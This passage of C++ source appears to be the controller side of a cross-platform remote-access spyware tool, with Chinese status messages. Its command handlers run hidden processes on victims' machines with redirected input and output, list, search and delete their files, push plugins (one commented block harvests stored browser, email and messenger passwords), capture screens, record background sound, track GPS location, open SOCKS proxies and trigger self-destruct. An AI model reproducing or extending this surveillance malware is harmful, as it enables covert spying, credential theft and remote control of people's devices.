		PPLUGIN_CXT* PlgCxtVect = NULL;

		switch ( dwSysType )
		{
		case WINDOWS_TARGET:
			PlgCxtVect = FrmMain->WindowsPlgCxtVect;
			break;
		case MACOS_TARGET:
			PlgCxtVect = FrmMain->MacPlgCxtVect;
			break;
		case IOS_TARGET:
			PlgCxtVect = FrmMain->IosPlgCxtVect;
			break;
		case ANDROID_TARGET:
			PlgCxtVect = FrmMain->AndroidPlgCxtVect;
			break;
		}
        
        PPLUGIN_CXT pluginCxt = PlgCxtVect[pluginId];
        if (pluginCxt)
        {
            if (pluginCxt->dwPluginVer > dwPluginVer)
            {
                StartUptPluginToDaemon(pluginId, pluginCxt->dwPluginVer, dwSysType);       // 开始升级到中转服务器
            }
        }
/*#ifdef _DEBUG
        else
        {
            xASSERT((FALSE));
        }
#endif // _DEBUG */       
    }
    else
    {
        // 处理目标插件
        //
        
        Target * tarBlock = GetTargetFromGlobalMap(targetId);
        if (tarBlock == NULL)
        {
            assert(tarBlock);
            return 0;
        }

        PPLUGIN_CXT pluginCxt = tarBlock->pluginVect[pluginId];
        if (NULL == pluginCxt)
        {
            pluginCxt = (PPLUGIN_CXT)malloc(sizeof(PLUGIN_CXT));
            ZeroMemory(pluginCxt, sizeof(PLUGIN_CXT));
            pluginCxt->dwPluginId = pluginId;

            tarBlock->pluginVect[pluginId] = pluginCxt;
        }

        pluginCxt->lpszPluginName = strdup(args[5].c_str());
        pluginCxt->dwPluginVer = atoi(args[6].c_str());
        pluginCxt->dwUpdateVer = atoi(args[7].c_str());
        pluginCxt->dwUpdateType = 0;            // UNUSED
        pluginCxt->dwLoadType = atoi(args[8].c_str());
        pluginCxt->lpszProcList = strdup(args[9].c_str());

        if (DM->TargetPluginIsExisted(targetId, pluginId))
        {
            DM->UpdateTargetPluginInfo(targetId, pluginCxt);
        }
        else
        {
            DM->InsertTargetPluginInfo(targetId, pluginCxt);
        }
    }

    return 0;
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_PLD(std::vector<std::string> & args)
{
    // TID PID PLD PID DATALEN\r\nDATA
    //  0   1   2   3     4
    //

    xASSERT((args.size() == 5));

    ULONG targetId = strtoul(args[0].c_str(),NULL,10);
    ULONG pluginId = strtoul(args[3].c_str(),NULL,10);

    std::string data;
    int dataLen = atoi(args[4].c_str());
    if (dataLen > 0)
    {
        if (false == IsWholeDataAvailable(dataLen))
        {
            RecoverCommand();
            return -1;
        }
        data = GetData(dataLen);
    }

    Target * tarBlock = GetTargetFromGlobalMap(targetId);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    tarBlock->pluginVect[pluginId]->dwDataLen = dataLen;

    if (tarBlock->pluginVect[pluginId]->lpbyData)
    {
        free(tarBlock->pluginVect[pluginId]->lpbyData);
    }
    
    if (dataLen > 0)
    {
        tarBlock->pluginVect[pluginId]->lpbyData = (PBYTE)malloc(dataLen);
        CopyMemory(tarBlock->pluginVect[pluginId]->lpbyData, data.c_str(), dataLen);
    }

    return 0;    
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_PLD(ULONG targetId, ULONG pluginId, PBYTE data, ULONG dataLen)
{
    // TID PID PLD PID DATALEN\r\nDATA
    //  0   1   2   3     4
    //

    std::ostringstream buf;
    buf << targetId << " 0 PLD " << pluginId << " " << dataLen << "\r\n";

    this->WriteDataCmd(buf.str(), (const char*)data, dataLen);

}
//---------------------------------------------------------------------------
void  TargetConnection::Send_SCP(ULONG  targetID)
{
    // TID PID SCP
    //
    std::ostringstream buf;
    buf << targetID << " 0 SCP\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_SCP(std::vector<std::string> & args)
{
    // TID PID SCP OK/ERR
    //
    ULONG targetId = strtoul(args[0].c_str(),NULL,10);

    Target * tarBlock = GetTargetFromGlobalMap(targetId);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

	if ( tarBlock->frmTarControl )
	{
		SendMessage(tarBlock->frmTarControl->Handle, WM_CAPFULLSCREEN_FINISHED, NULL, NULL);
	}
	
	return 1;
}

//---------------------------------------------------------------------------
void  TargetConnection::Send_LIR(ULONG targetId)

{

    // TID PID LIR

    //  0   1   2
    //

    std::ostringstream buf;

    buf << targetId << " 0 LIR\r\n";
    Write(buf);

}

//---------------------------------------------------------------------------

int  TargetConnection::Handle_LIR(std::vector<std::string> & args)
{

	// TID PID LIR DATA DATALEN\r\nDIRINFORMATION

	//  0   1   2    3   4              5
	//


    xASSERT((args.size() == 5));


    std::string data;
	int			dataLen = 0;

	if ("DATA" == args[3])
	{
		dataLen = atoi(args[4].c_str());
        if (false == IsWholeDataAvailable(dataLen))
		{
  			RecoverCommand();
			return -1;
		}
		data = GetData(dataLen);
	}


    ULONG targetID = strtoul(args[0].c_str(), NULL, 10);
    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    if ("DATA" == args[3])
    {
        CopyMemory(&tarBlock->logicDriverSet , data.c_str(), dataLen);

        // 存储到数据库中
        //
        DM->AddTargetLogicDriver(tarBlock->dwTargetID, tarBlock->logicDriverSet);

        // 更新界面
        //
        if (tarBlock->frmTarControl)
        {
            SendMessage(tarBlock->frmTarControl->Handle, WM_UPDATE_LIRINFO, NULL, NULL);
        }
    }

    return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_DIR(ULONG targetId, const char  *base64Path)
{
    // TID PID DIR Path
    //  0   1   2   3
    //

    xASSERT((base64Path));
    
    std::ostringstream buf;
    buf << targetId << " 0 DIR " << base64Path << "\r\n";
    Write(buf);
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_DIR(std::vector<std::string> & args)
{
	// TID PID DIR PATH DATA DATALEN\r\nDIRINFORMATION
	//  0   1   2    3   4      5            6
	//

	// TID PID DIR PATH OK   0(1)    0 -- begin, 1 -- end
	//  0   1   2    3   4    5
	//

	// TID PID DIR PATH ERR ErrorCode
	//  0   1   2    3   4      5
	//

    xASSERT((args.size() == 6));

    std::string data;                                 
	int			dataLen = 0;

	if ("DATA" == args[4])
	{
		dataLen = atoi(args[5].c_str());
        if (false == IsWholeDataAvailable(dataLen))
		{
  			RecoverCommand();
			return -1;
		}
		data = GetData(dataLen);
	}

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    // Here args[3] is base64 path
    //

    string pathBase64 = args[3];

    if ("DATA" == args[4])
    {
        // gather and store DATA
        //
        std::string dirInfo = tarBlock->dirInfoMap[pathBase64];
        dirInfo += data;
        tarBlock->dirInfoMap[pathBase64] = dirInfo;
    }
    else
    {
        std::wstring widPath = GetWideFromBase64(pathBase64.c_str());
        int nErrCode = 0;
        
        if ("OK" == args[4])
        {
            if ("0" == args[5])
            {
                tarBlock->dirInfoMap[pathBase64] = "";
                return 0;
            }
            else     // "1"
            {
                time_t curtime;
                time(&curtime);
                std::string timStr = GetTimeString(curtime);
            
                DM->AddOfflineDirInfo(tarBlock,
                                      timStr,
                                      pathBase64.c_str(),
                                      tarBlock->dirInfoMap[pathBase64].c_str());

                SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[目标%s(ID:%u)] 远程获取\"%s\"文件列表成功",
                                                tarBlock->widTargetName.c_str(),
                                                tarBlock->dwTargetID,
                                                widPath.c_str());
            }
        }
        else      // ERR
        {
            nErrCode = strtoul(args[5].c_str(), NULL, 10);

            SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[目标%s(ID:%u)] 远程获取\"%s\"文件列表失败: %s",
                                                    tarBlock->widTargetName.c_str(),
                                                    tarBlock->dwTargetID,
                                                    widPath.c_str(),
                                                    ConvertErrorIdToStrW(nErrCode).c_str());
        }

        if (tarBlock->frmTarControl)
        {
            SendMessage(tarBlock->frmTarControl->Handle, WM_UPDATE_DIRINFO, (LONG)widPath.c_str(), (long)nErrCode);
        }
    }

    return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_FDL(ULONG targetId, const char *base64Path)
{
    // TID PID FDL FILEPATH
    //  0   1   2     3
    //
    std::ostringstream buf;
    buf << targetId << " 0 FDL " << base64Path << "\r\n";
    this->Write(buf);
}

//---------------------------------------------------------------------------

int   TargetConnection::Handle_FDL(std::vector<std::string> & args)
{
    // TID PID FDL FILEPATH OK(ERR) [ErrId]
    //  0   1   2     3       4       5
    //

    if (args.size() != 5 && args.size() != 6)
    {
        assert(false);
        return 0;
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    std::wstring fdlPathw = GetWideFromBase64(args[3].c_str());

    if ("OK" == args[4])
    {
		if ( tarBlock->widTargetName != PhoneRecordFile )
			SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[目标%s(ID:%u)] 远程删除文件\"%s\" 成功",
										  tarBlock->widTargetName.c_str(),
										  tarBlock->dwTargetID,
										  fdlPathw.c_str());
    }
    else
    {
        ULONG lastErrCode = strtoul(args[5].c_str(),NULL,10);
        SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[目标%s(ID:%u)] 远程删除文件\"%s\" 失败: %s",
                                        tarBlock->widTargetName.c_str(),
                                        tarBlock->dwTargetID,
                                        fdlPathw.c_str(),
                                        ConvertErrorIdToStrW(lastErrCode).c_str());
    }

    return 0;
}

//---------------------------------------------------------------------------
void  TargetConnection::Send_OSC(ULONG          targetID,
                                            ULONG          osId,
                                            const char*          tarDirPathBase64,
                                            ULONG          level,
                                            PSearchFilter  lpSearchFilter)
{
	// TID PID OSC OSID TarDirPathBase64 LEVEL
    //  0   1   2    3		    4           5

    // MinSize MaxSize LowBegTime HighBegTime LowEndTime HighEndTime NameBase64 TypeBase64\r\n
	//   6        7        8          9           10          11        12         13
    //
    xASSERT((lpSearchFilter));

    std::ostringstream buf;
    buf << targetID << " 0 OSC " << osId << " " << tarDirPathBase64 << " " << level 
        << " " << lpSearchFilter->dwMinSize << " " << lpSearchFilter->dwMaxSize
        << " " << lpSearchFilter->uliBegTime.LowPart << " " << lpSearchFilter->uliBegTime.HighPart
        << " " << lpSearchFilter->uliEndTime.LowPart << " " << lpSearchFilter->uliEndTime.HighPart
        << " " << GetBase64FromWide(lpSearchFilter->widName).c_str() << " " << GetBase64FromWide(lpSearchFilter->widType).c_str() << "\r\n";

    this->Write(buf);
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_OSC(std::vector<std::string> & args)
{
	// TID PID OSC OsId OK/ERR  ErrId
    //  0   1   2   3    4        5
    //
    
    if (args.size() != 5 && args.size() != 6)
    {
        assert(false);
        return 0;
    }
    
    ULONG targetId = strtoul(args[0].c_str(), NULL, 10);
    Target * tarBlock = GetTargetFromGlobalMap(targetId);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    DWORD   dwOsId = strtoul(args[3].c_str(), NULL, 10);

    if (args[4] == "ERR")
    {
        int lastErrCode = strtoul(args[5].c_str(),NULL,10);

        SetTarStatusInfoExW(STATUS_NOTE, tarBlock, L"[目标%s(ID:%d)] 启动在线搜索失败: %s",
                                        tarBlock->widTargetName.c_str(),
                                        tarBlock->dwTargetID,
                                        ConvertErrorIdToStrW(lastErrCode).c_str());

		if ( tarBlock->frmTarControl )
		{
			SendMessage(tarBlock->frmTarControl->Handle, WM_ONLINESEARCH_ERRORED, lastErrCode, dwOsId);
		}
    }

	return 1;
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_OSI(std::vector<std::string> & args)
{
 	// TID PID OSI OsId PathBase64 NameBase64 FileSize FileAttributes LowLastWriteTime HighLastWriteTime\r\n
	//  0   1   2   3	    4			5		 6				7			 8					9

    if (args.size() != 10)
    {
        assert(false);
        return 0;
    }

    ULONG targetId = strtoul(args[0].c_str(), NULL, 10);
    Target * tarBlock = GetTargetFromGlobalMap(targetId);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    ULONG   osId = strtoul(args[3].c_str(), NULL, 10);

    PFILE_BLOCK lpFileBlock = new FILE_BLOCK();

    lpFileBlock->widPath = GetWideFromBase64(args[4].c_str());
    lpFileBlock->widName = GetWideFromBase64(args[5].c_str());
    lpFileBlock->Size = strtoul(args[6].c_str(), NULL, 10);
    lpFileBlock->FileAttributes = strtoul(args[7].c_str(), NULL, 10);

    ULARGE_INTEGER ulLastWriteTime;
    ulLastWriteTime.LowPart = strtoul(args[8].c_str(), NULL, 10);
    ulLastWriteTime.HighPart = strtoul(args[9].c_str(), NULL, 10);
    lpFileBlock->LastWriteTime = ulLastWriteTime.QuadPart;
    
    if (tarBlock->frmTarControl)
    {
        SendMessage(tarBlock->frmTarControl->Handle, WM_ONLINESEARCH_FOUND_BLOCK, osId, (long)lpFileBlock);
    }

	return 1;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_OSF(ULONG     targetID,
                                            ULONG     osId)
{
	// TID PID OSF OsId
	//  0   1   2    3

    std::ostringstream buf;
    buf << targetID << " 0 OSF " << osId << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_OSF(std::vector<std::string> & args)
{
	// TID PID OSF OsId  Flag (1 - finished, 0 - canceled)
	//  0   1   2    3     4

    if (args.size() != 5)
    {
        assert(false);
        return 0;
    }

    ULONG targetId = strtoul(args[0].c_str(), NULL, 10);
    Target * tarBlock = GetTargetFromGlobalMap(targetId);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    DWORD osId = strtoul(args[3].c_str(), NULL, 10);
    DWORD flag = strtoul(args[4].c_str(), NULL, 10);
    
    if (tarBlock->frmTarControl)
    {
        SendMessage(tarBlock->frmTarControl->Handle, WM_ONLINESEARCH_FINISHED, osId, flag);
    }

	return 1;
}

//---------------------------------------------------------------------------
void  TargetConnection::Send_PLG(ULONG   targetId,
                                             ULONG   pluginId,
                                             char    *plgType)
{
    // TID PID PLG PLGTYPE PID
    //  0   1   2      3    4
    //

    // @@NOTE:
    //    the first PID is PID of manager plugin
    //    the second PID is real PID

    std::ostringstream buf;
    buf << targetId << " 1 PLG "
        << plgType << " " << pluginId << "\r\n";
    Write(buf);
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_PLG(std::vector<std::string> & args)
{ 
    // TID PID PLG PLGTYPE PID OK
    //  0   1   2     3     4   5
    //

    // TID PID PLG PLGTYPE PID ERR ErrorId
    //  0   1   2     3     4   5     6 
    //

    if (args.size() != 6 && args.size() != 7)
    {
        assert(false);
        return 0;
    }
        
    ULONG targetId = strtoul(args[0].c_str(),NULL,10);
    ULONG pluginId = strtoul(args[4].c_str(),NULL,10);

    Target * tarBlock = GetTargetFromGlobalMap(targetId);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    UINT    msgId  = 0;
    UINT    lastErrCode = 0;

    if (args[3] == "STA")
    {
        if (args[5] == "OK")
        {
            SetTarStatusInfoExW(STATUS_NOTE, tarBlock, L"[目标%s(ID:%d)] 成功启用%s",
                                        tarBlock->widTargetName.c_str(),
                                        tarBlock->dwTargetID,
                                        ConvertPluginIdToLangW(pluginId).c_str());

//            msgId = WM_LOADPLUGIN_SUCCESS;
            
/* @@@           if (DPAPI_PLUGIN_ID == pluginId)
            {
                tarBlock->dpapiLoadFlag = TRUE;

                tarBlock->ieAutoString = "";
                tarBlock->iePassString = "";
                tarBlock->emailString  = "";
                tarBlock->imsString    = "";

                this->Send_DPA(targetId, "ATO");
                this->Send_DPA(targetId, "PAS");
                this->Send_DPA(targetId, "EMA");
                this->Send_DPA(targetId, "IMS");
            }*/            
        }
        else        // ERR
        {
            lastErrCode = strtoul(args[6].c_str(),NULL,10);
                    
            SetTarStatusInfoExW(STATUS_NOTE, tarBlock, L"[目标%s(ID:%d)] 启用%s 失败: %s",
                                        tarBlock->widTargetName.c_str(),
                                        tarBlock->dwTargetID,
                                        ConvertPluginIdToLangW(pluginId).c_str(),
                                        ConvertErrorIdToStrW(lastErrCode).c_str());

//           msgId = WM_LOADPLUGIN_FAILURE;
        }
    }
    else if (args[3] == "STO")
    {
        if (args[5] == "OK")
        {
            SetTarStatusInfoExW(STATUS_NOTE, tarBlock, L"[目标%s(ID:%d)] 成功停用 %s",
                                        tarBlock->widTargetName.c_str(),
                                        tarBlock->dwTargetID,
                                        ConvertPluginIdToLangW(pluginId).c_str());
                                    
//           msgId = WM_UNLOADPLUGIN_SUCCESS;

/* @@@           if (DPAPI_PLUGIN_ID == pluginId)
            {
                tarBlock->dpapiLoadFlag = FALSE;
            }*/
        }
        else        //ERR
        {
            lastErrCode = strtoul(args[6].c_str(),NULL,10);

            SetTarStatusInfoExW(STATUS_NOTE, tarBlock, L"[目标%s(ID:%d)] 停用%s失败: %s",
                                        tarBlock->widTargetName.c_str(),
                                        tarBlock->dwTargetID,
                                        ConvertPluginIdToLangW(pluginId).c_str(),
                                        ConvertErrorIdToStrW(lastErrCode).c_str());

//            msgId = WM_UNLOADPLUGIN_FAILURE;
        }
    }

    if (tarBlock->frmTarControl)
    {
        SendMessage(tarBlock->frmTarControl->Handle, msgId, pluginId, NULL);
    }
    
    return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_RUN(DWORD dwTargetId, std::wstring procPath, BOOL bRedirectIO)
{
    // TID PID RUN SHOWTYPE IOTYPEProcPath
    //  0   1   2     3        4
    //
    std::string pathBase64 = GetBase64FromWide(procPath);
    std::ostringstream buf;
    
    if (bRedirectIO)
    {
        buf << dwTargetId << " 0 RUN HIDE IO " << pathBase64.c_str() << "\r\n";
    }
    else
    {
        buf << dwTargetId << " 0 RUN HIDE NO " << pathBase64.c_str() << "\r\n";
    }

    Write(buf);    
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_RUN(std::vector<std::string> & args)
{
    // TID PID RUN SHOWTYPE IOTYPE ProcPath OK[ERR] ErrID
    //  0   1   2     3       4       5         6    7
    //

    if (args.size() != 8 && args.size() != 7)
    {
        assert(false);
        return 0;
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }
        
    std::wstring procPath = GetWideFromBase64(args[5].c_str());

    if (args[6] == "OK")
    {
        SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[目标%s(ID:%u)] 成功创建进程:%s",
                                                                tarBlock->widTargetName.c_str(),
                                                                targetID,
                                                                procPath.c_str());    
        if (args[4] == "IO")
        {
            tarBlock->bRedirectIO = true;
            tarBlock->widRedirectProc = procPath;
            SendMessage(tarBlock->frmTarControl->Handle, WM_REMOTERUN_REDIRECT, NULL, NULL);
        }
    }
    else
    {
        SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[目标%s(ID:%u)] 创建进程出错:%s",
                                                                tarBlock->widTargetName.c_str(),
                                                                targetID,
                                                                procPath.c_str());
    }
    
    return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_CITW(DWORD dwTargetID, std::wstring widInput)
{
    // TID PID CIT A/W INPUTBASE64
    //  0   1   2   3     4
    //

    std::string inputBase64 = GetBase64FromWide(widInput);

    std::ostringstream buf;
    buf << dwTargetID << " 0 CIT W " << inputBase64.c_str() << "\r\n";
    Write(buf); 
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_CITA(DWORD dwTargetID, std::string aniInput)
{
    // TID PID CIT A/W INPUTBASE64
    //  0   1   2   3     4
    //

    std::string inputBase64 = GetBase64FromAnsi(aniInput);

    std::ostringstream buf;
    buf << dwTargetID << " 0 CIT A " << inputBase64.c_str() << "\r\n";
    Write(buf);
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_CIT(std::vector<std::string> & args)
{
    // TID PID CIT OK/ERR [ERRID]
    //  0   1   2    3       4
    //
    if (args.size() != 4 && args.size() != 5 )
    {
        assert(false);
        return 0;
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }
    
    if (args[3] == "OK")
    {
        SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[目标%s(ID:%u)] 成功进行交互式输入",
                                                                tarBlock->widTargetName.c_str(),
                                                                targetID);
    }
    else
    {
        SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[目标%s(ID:%u)] 交互式输入出错",
                                                                tarBlock->widTargetName.c_str(),
                                                                targetID);
    }

    return 0;

}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_COT(std::vector<std::string> & args)
{
    // TID PID COT DATA  A(W) LEN\r\nDATA
    //  0   1   2   3    4     5
    //

    if (args.size() != 6)
    {
        assert(false);
        return 0;
    }
        
    std::string data;
	int			dataLen = atoi(args[args.size() - 1].c_str());

    if (false == IsWholeDataAvailable(dataLen))
	{
		RecoverCommand();
    	return -1;
	}
	data = GetData(dataLen);

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    if (args[4] == "W")
    {
		tarBlock->widRedirectOutput = AnsiToWide(data);
    }
    else
    {
        std::string aniOutput = data.c_str();
		tarBlock->widRedirectOutput = AnsiToWide(aniOutput);
    }

    if (tarBlock->frmTarControl)
    {
        SendMessage(tarBlock->frmTarControl->Handle, WM_REMOTERUN_OUTPUT, NULL, NULL);
    }

    return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_CFI(DWORD dwTargetID)
{
	// TID PID CFI 
	//  0   1   2  
	//
    std::ostringstream buf;
    buf << dwTargetID << " 0 CFI\r\n";
    Write(buf);    
}

void TargetConnection::Send_GPRS(DWORD dwTargetId)
{
	// TID PID GPRS
	//  0   1   2
	//

	std::ostringstream buf;

	buf << dwTargetId << " 0 GPRS\r\n";

	this->Write(buf);
}

void TargetConnection::Send_AGT(ULONG targetID, TaskDirect taskDirect, const char* tarDirPathBase64, ULONG level, ULONG autoDown)
{
	// TID PID AGT TaskDirect TarDisPathBase64 LEVEL AutoDown
	//  0   1   2      3		   4		     5		6
	//

	std::ostringstream buf;
	buf << "0" << " 1 AGT DOW " << tarDirPathBase64 << " " << level << " " << autoDown << "\r\n";
	this->Write(buf);
}

void TargetConnection::Send_BACKSOUND(ULONG targetID, bool open, ULONG time)
{
	std::ostringstream buf;
	buf << targetID << " 0 BGS " << (open ? "1" : "0") << " " << time << "\r\n";
	this->Write(buf);
}

int TargetConnection::Handle_GPRS(std::vector<std::string> & args)
{
	// TID PID GPRS EastLongitude NorthLatitude remark
	//  0   1   2	   3		  4                5
	//

	//_ASSERT( 6 == args.size() );

	ULONG targetID = strtoul(args[0].c_str(),NULL,10);
	std::wstring time = AnsiToWide(TGetCurrentTime());
	std::wstring x = AnsiToWide(args[3]);
	std::wstring y = AnsiToWide(args[4]);

	Target * tarBlock = GetTargetFromGlobalMap(targetID);

	if ( x == L"0.000000" && y == L"0.000000" )
	{
		SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[目标%s(ID:%u)] 目标可能未打开 GPS 定位功能",
			tarBlock->widTargetName.c_str(),
			targetID);

		return 0;
	}


	std::wstring remark = GetWideFromBase64(args[5]);

	SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[目标%s(ID:%u)] 目标当前所在位置为 : %s",
		tarBlock->widTargetName.c_str(),
		targetID,
		remark.c_str());


	DM->InsertLocationInfo(targetID, time, x, y, remark);

	if ( tarBlock->frmTarControl )
	{
		SendMessage(tarBlock->frmTarControl->Handle, WM_NEW_LOCATION, NULL, NULL);
	}

	return 0;

}

//---------------------------------------------------------------------------
int  TargetConnection::Handle_CFI(std::vector<std::string> & args)
{
	// TID PID CFI 
	//  0   1   2  
	//
    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    if (tarBlock->frmTarControl)
    {
        SendMessage(tarBlock->frmTarControl->Handle, WM_REMOTERUN_FINISHED, NULL, NULL);
    }

    return 0;    
}
//---------------------------------------------------------------------------
// 创建进程
void  TargetConnection::Send_CRP(Target *tarBlock, std::wstring procPath, BOOL bHideExec)
{
    // TID PID CRP HIDE ProcPath
    // TID PID CRP SHOW ProcPath
    //  0   1   2   3      4
    //
    std::string pathBase64 = GetBase64FromWide(procPath);
    std::ostringstream buf;
    
    if (bHideExec)
    {
        buf << tarBlock->dwTargetID << " 1 CRP HIDE " << pathBase64.c_str() << "\r\n";
    }
    else
    {
        buf << tarBlock->dwTargetID << " 1 CRP SHOW " << pathBase64.c_str() << "\r\n";
    }

    Write(buf);
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_CRP(std::vector<std::string> & args)
{
	// TID PID CRP OK(ERR) [ErrorId]\r\n
	//  0   1   2   3          4
	//

    if (args.size() != 4 && args.size() != 5 )
    {
        assert(false);
        return 0;
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }
    
    if (args[3] == "OK")
    {
        SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[目标%s(ID:%u)] 成功创建进程",
                                                                tarBlock->widTargetName.c_str(),
                                                                targetID);
    }
    else
    {
        SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[目标%s(ID:%u)] 创建进程出错",
                                                                tarBlock->widTargetName.c_str(),
                                                                targetID);
    }

    return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_ERA(ULONG targetId)
{
    // TID PID ERA
    //
    std::ostringstream buf;
    buf << targetId << " 1 ERA\r\n";
    this->Write(buf);    
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_ERA(std::vector<std::string> & args)
{
    // TID PID ERA Ret
    //  0   1   2   3 
    //

    ULONG targetId = strtoul(args[0].c_str(), NULL, 10);
    ULONG ret      = strtoul(args[3].c_str(), NULL, 10);

    PostMessage(FrmMain->Handle, WM_ERASE_TARGET, targetId, ret); 

    return 0;
}

//---------------------------------------------------------------------------
int  TargetConnection::Handle_SIL(std::vector<std::string> & args)
{
    // TID PID SIL  OK 
    //  0   1   2   3
    //
    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        return 0;
    }

    SetStatusInfoExW(STATUS_INFO, L"[目标%s(ID:%d)]静默指令成功下达!",
                                tarBlock->widTargetName.c_str(), targetID );
    return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_SIL(ULONG targetId, FILETIME &ftBeg, FILETIME &ftEnd)
{
    // TID PID SIL HighPartEnd LowPartEnd HighPartBeg LowPartBeg
	//  0   1   2       3          4            5          6
	//
    std::ostringstream buf;
    buf << targetId << " 0 SIL " << ftEnd.dwHighDateTime << " " << ftEnd.dwLowDateTime
        << " " << ftBeg.dwHighDateTime << " " << ftEnd.dwLowDateTime << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_SDS(ULONG targetId)
{
    // TID PID SDS LiveFlag
    //  0   1   2     3
    //
    std::ostringstream ss;
    ss << targetId << " 0 SDS 0\r\n";
    Write(ss);
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_SDS(std::vector<std::string> & args)
{
    // TID PID SDS OK 
    //  0   1   2   3
    //
    
    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    SetStatusInfoExA(STATUS_INFO, "[目标%d(ID:%d)] 自毁指令成功下达，目标将会在重启之后自毁!", targetID);
    return 0;
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_SSX(std::vector<std::string> & args)
{
    // TID PID SSX FLAG
    //  0   1   2    3
    //
    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        return 0;
    }

    ULONG flag = strtoul(args[3].c_str(), NULL, 10);

    if (flag == 1)
    {
        SetStatusInfoExW(STATUS_INFO, L"[目标%s(ID:%d)] SOCKS代理启用成功",
                                    tarBlock->widTargetName.c_str(), targetID );
    }
    else
    {
        SetStatusInfoExW(STATUS_INFO, L"[目标%s(ID:%d)] SOCKS代理启用失败",
                                    tarBlock->widTargetName.c_str(), targetID );
    }
    
    return 0;
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_ESX(std::vector<std::string> & args)
{
    // TID PID ESX FLAG
    //  0   1   2    3
    //
    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        return 0;
    }

    ULONG flag = strtoul(args[3].c_str(), NULL, 10);

    if (flag == 1)
    {
        SetStatusInfoExW(STATUS_INFO, L"[目标%s(ID:%d)] SOCKS代理停用成功!",
                                    tarBlock->widTargetName.c_str(), targetID );
    }
    else
    {
        SetStatusInfoExW(STATUS_INFO, L"[目标%s(ID:%d)] SOCKS代理停用失败!",
                                    tarBlock->widTargetName.c_str(), targetID );
    }
    
    return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_SSX(ULONG ulTargetID,  USHORT usPort)
{
    // TID PID PXY AUTH PORT
    //  0   1   2   3     4
    //
    std::ostringstream ss;
    ss << ulTargetID << " 0 SSX 0 " << usPort << "\r\n";
    Write(ss);
}
//---------------------------------------------------------------------------
